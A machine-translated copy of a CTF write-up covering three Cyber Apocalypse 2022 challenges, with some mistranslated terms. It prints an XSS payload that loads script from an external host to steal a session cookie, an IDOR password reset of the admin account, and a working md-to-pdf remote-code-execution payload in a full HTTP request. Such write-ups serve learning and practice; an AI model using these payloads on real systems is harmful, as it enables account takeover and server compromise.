<html>
<head>
<title>Cyber Apocalypse CTF 2022 — Intergalactic Chase Write up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">网络启示录CTF 2022——星际追逐报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cyber-apocalypse-ctf-2022-intergalactic-chase-write-up-6d2e89b1633e?source=collection_archive---------1-----------------------#2022-05-19">https://infosecwriteups.com/cyber-apocalypse-ctf-2022-intergalactic-chase-write-up-6d2e89b1633e?source=collection_archive---------1-----------------------#2022-05-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/c6142e83e18dbf5f52b0e176d01606da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*r3hS0FFDbHjjcrWC.jpg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://ctf.hackthebox.com/static/ca/cyber_apocalypse_2022_ca.jpg" rel="noopener ugc nofollow" target="_blank">https://CTF . hackthebox . com/static/ca/cyber _启示录_2022_ca.jpg </a></figcaption></figure><p id="85fe" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">大家好，我是<strong class="kf ir"> Hac </strong>，今天我们要做的是2022年CTF网络启示录，特别是这些挑战</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="8003" class="lk ll iq lg b gy lm ln l lo lp"><strong class="lg ir">- Kryptos Support (Web)<br/>- BlinkerFluids  (web)<br/>- Compressor (Misc)</strong></span></pre><p id="5e38" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们将首先从<strong class="kf ir">氪星支持(Web)开始。</strong>我们走吧<strong class="kf ir"> ……… </strong></p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div class="gh gi lq"><img src="../Images/71935a75474d1a9c5a7b1bed98718a38.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/format:webp/1*Qk5i8-CCWPGBjPknyaOaBQ.png"/></div></figure><p id="7d9a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在访问该页面时，我们看到有一个输入字段，我们可以在那里输入一些内容，然后由管理员检查(这就像一个报告系统，我们的报告将由管理员用户或其他用户组检查)。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lr"><img src="../Images/c471dc2c170dd6c2045a3cffef2aeecc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W436GeC7EJfTYqg-tOjenw.png"/></div></div></figure><p id="9b62" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我想知道我能做些什么，我已经玩了很多CTF的(仍然是一个新手)，所以我想试试XSS，但不是你的传统警报(1)，因为事情没有在我们这边发生，我们需要知道我们的有效载荷是否工作。这就是为什么我使用<a class="ae kc" href="https://xsshunter.com/" rel="noopener ugc nofollow" target="_blank"> XSShunter </a>有其他方法来做这项工作，但我将坚持使用<a class="ae kc" href="https://xsshunter.com/" rel="noopener ugc nofollow" target="_blank"> XSShunter </a>。这是我们的有效载荷🢃</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="e3ed" class="lk ll iq lg b gy lm ln l lo lp">"&gt;&lt;script src=<a class="ae kc" href="https://hac10101.xss.ht" rel="noopener ugc nofollow" target="_blank">https://</a>someone-in-somewhere-redacted.com&gt;&lt;/script&gt;</span></pre><figure class="lb lc ld le gt jr gh gi paragraph-image"><div class="ab gu cl ls"><img src="../Images/16e468289feb4c17d06aabbc18607a4e.png" data-original-src="https://miro.medium.com/v2/format:webp/1*7XFeD2O_RvSE3JQfQ7Y2Iw.png"/></div></figure><p id="82f6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们的XSS有效载荷爆炸了，我在想我在这里能做什么？对我来说很有趣的一件事是我们可以吃到饼干。该用户可能是管理员或具有相同或稍低权限的其他用户。</p><p id="6b3e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因为我们身边没有饼干，所以我对饼干很感兴趣。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/9846d351f1359b364276646b6fcc42ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FYmOt6K34bAGBbbeEwdMHw.png"/></div></div></figure><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="9691" class="lk ll iq lg b gy lm ln l lo lp">##### Cookies (Non-HTTPOnly)<br/>`session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI`</span></pre><p id="8af0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我们可以在浏览器中添加这个cookie了。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/e390d3c5fa739eb37e6222e8bda4a38d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b5r32F8986622KEGRInEwQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">添加cookie</figcaption></figure><p id="8dce" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">之后，我们将导航到/tickets(感谢我出色的团队成员<a class="ae kc" href="https://twitter.com/KDirectorate" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> KDirectorate </strong> </a>)。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lu"><img src="../Images/411b218d9adc0b20a8affcee925c2ec7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TbB_L_yUmudIBdeHBFZtzA.png"/></div></div></figure><p id="59c6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我想知道我能在这里做什么，这个页面似乎是静态的(除了一些东西)。我试了/RFID/一些号码，但都不成功</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lv"><img src="../Images/d9990220ca1ce91b9c314419323bc70e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KdLepcVpY1l_zH1fgUI8sA.png"/></div></div></figure><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lw"><img src="../Images/97088e4fb3d23753e086dcca7c16c75d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MPep_ybBFUDvz4sik8v7GQ.png"/></div></div></figure><p id="e2db" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我的一个队友(<a class="ae kc" href="https://twitter.com/KDirectorate" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> KDirectorate </strong> </a>)对“检查/设置哪个有密码重置功能”说，真的很有意思。我导航到/setting并截取了burp suite中的响应。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/4c4b03e4845e5a7d930481c532b7c7cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oNhJjWg_R5NdTnV0VMRPKw.png"/></div></div></figure><p id="e670" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">一个是“密码”，另一个是“uid”(就像用户名)。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lx"><img src="../Images/d21bc956bd23e0319029c47fb24d66df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q8EtPEt5_rU2rF_aNin0Ng.png"/></div></div></figure><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ly"><img src="../Images/a2897b94f42d8d12652d4183b5542eed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zjo2pIHGALIc53tmyTirpg.png"/></div></div></figure><p id="9f6e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我想如果我把<strong class="kf ir"> uid </strong>的值改成1呢？(大多数情况下1 =管理员)</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/5a00d2a37eadd5d35e986e3afd6f2074.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R0rA-79OMhdDdf52ZUFR2g.png"/></div></div></figure><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ma"><img src="../Images/18cd50a3b5a9d29b386efc719a77d733.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_B1TEUgN5DGEAx9iLTyr6w.png"/></div></div></figure><p id="661c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我就可以修改管理员的密码了。之后，我尝试以管理员身份登录，并成功了。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mb"><img src="../Images/b8b57440b7b81fe1e5a2bafe0e462f16.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*18fs1Mp1NUsHRi-nuJ_RPg.png"/></div></div></figure><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lt"><img src="../Images/0b55fb0e37720672a2dd2c2554856c2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BoKfqf3Ly6rjIzLTmwyGXA.png"/></div></div></figure></div><div class="ab cl mc md hu me" role="separator"><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh"/></div><div class="ij ik il im in"><h1 id="885e" class="mj ll iq bd mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bi translated"><strong class="ak"> BlinkerFluids(卷筒纸)</strong></h1><p id="35d4" class="pw-post-body-paragraph kd ke iq kf b kg ng ki kj kk nh km kn ko ni kq kr ks nj ku kv kw nk ky kz la ij bi translated">在这个挑战中，<strong class="kf ir"> md-to-pdf </strong>中有一个<strong class="kf ir"> RCE </strong>，我们将使用它来获取标志(感谢<a class="ae kc" href="https://twitter.com/KDirectorate" rel="noopener ugc nofollow" target="_blank"><strong class="kf ir">k Directorate</strong></a><strong class="kf ir">)</strong>如果我们检查挑战文件，我们将遇到🢃</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="03b6" class="lk ll iq lg b gy lm ln l lo lp">'--no-sandbox', '--js-flags=--noexpose_wasm,--jitless</span></pre><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/8588f48e50d2ebd1fddebb9beddf07e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4OJp9oW9x8nknTq29hlIdw.png"/></div></div></figure><p id="e7a8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这里没有“—没有沙箱”意味着我们可以访问主机环境。</p><p id="6755" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我用来了解这种利用的一些资源</p><div class="nm nn gp gr no np"><a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880" rel="noopener  ugc nofollow" target="_blank"><div class="nq ab fo"><div class="nr ab ns cl cj nt"><h2 class="bd ir gy z fp nu fr fs nv fu fw ip bi translated">远程代码执行(RCE)MD-to-pdf | CVE-2021-23639 | Snyk</h2><div class="nw l"><h3 class="bd b gy z fp nu fr fs nv fu fw dk translated">您的应用程序使用这个易受攻击的包吗？只需点击几下鼠标，我们就可以分析您的整个应用程序，并了解…</h3></div><div class="nx l"><p class="bd b dl z fp nu fr fs nv fu fw dk translated">security.snyk.io</p></div></div></div></a></div><div class="nm nn gp gr no np"><a href="https://github.com/simonhaenisch/md-to-pdf/issues/99" rel="noopener  ugc nofollow" target="_blank"><div class="nq ab fo"><div class="nr ab ns cl cj nt"><h2 class="bd ir gy z fp nu fr fs nv fu fw ip bi translated">安全性:灰质暴露了导致任意代码执行问题的前端问题JS-engine…</h2><div class="nw l"><h3 class="bd b gy z fp nu fr fs nv fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="nx l"><p class="bd b dl z fp nu fr fs nv fu fw dk translated">github.com</p></div></div><div class="ny l"><div class="nz l oa ob oc ny od jw np"/></div></div></a></div><p id="8e17" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，我们将在burp suite中截取响应，我将添加我的有效载荷。</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="4f2a" class="lk ll iq lg b gy lm ln l lo lp">---js\n((require('child_process')).execSync('id &gt; /tmp/RCE.txt'))\n---RCE</span></pre><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oe"><img src="../Images/87a99dcf495777bec341c09332819bbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qPdYNQTIMMEceinzb8X6Nw.png"/></div></div></figure><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi gj"><img src="../Images/fff908aea1c0249435e0330c03067a0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v21NetEDyEV1y51f817eCQ.png"/></div></div></figure><p id="5b8f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们能够执行我们的代码</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="0e09" class="lk ll iq lg b gy lm ln l lo lp">POST /api/invoice/add HTTP/1.1<br/>Host: 46.101.27.51:32374<br/>Content-Length: 24<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br/>Content-Type: application/json<br/>Accept: */*<br/>Origin: <a class="ae kc" href="http://46.101.27.51:32374" rel="noopener ugc nofollow" target="_blank">http://46.101.27.51:32374</a><br/>Referer: <a class="ae kc" href="http://46.101.27.51:32374/" rel="noopener ugc nofollow" target="_blank">http://46.101.27.51:32374/</a><br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8<br/>Connection: close</span><span id="6954" class="lk ll iq lg b gy of ln l lo lp">{"markdown_content":"---js\n((require('child_process')).execSync('ls &gt; static/RCE.txt'))\n---RCE"}</span></pre><p id="fa58" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们可以通过简单的枚举来获得标志。</p></div><div class="ab cl mc md hu me" role="separator"><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh"/></div><div class="ij ik il im in"><p id="b02c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">压缩机(杂项)</strong></p><p id="029f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这个挑战中，我们将利用命令注入来获取flag。</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi og"><img src="../Images/b7407711125ca4a4dce4b29e8b5d9d97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tSZ3UPP2KH0gE-LiyB9kdA.png"/></div></div></figure><p id="c15c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这个很简单，所以我会很快完成</p><figure class="lb lc ld le gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oh"><img src="../Images/4f2f629477ea6de67c731b64a77856f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yrhoZwqjVuPTAo9BV-AGZg.png"/></div></div></figure><figure class="lb lc ld le gt jr gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/7a0bf4a0c505c1acaf4b64090612682d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/1*TV-FlMewtCG4juS9MnsjoQ.png"/></div></figure><p id="8c9e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们能够执行不同的命令，通过简单的枚举，我们可以找到标志。</p></div></div>    
</body>
</html>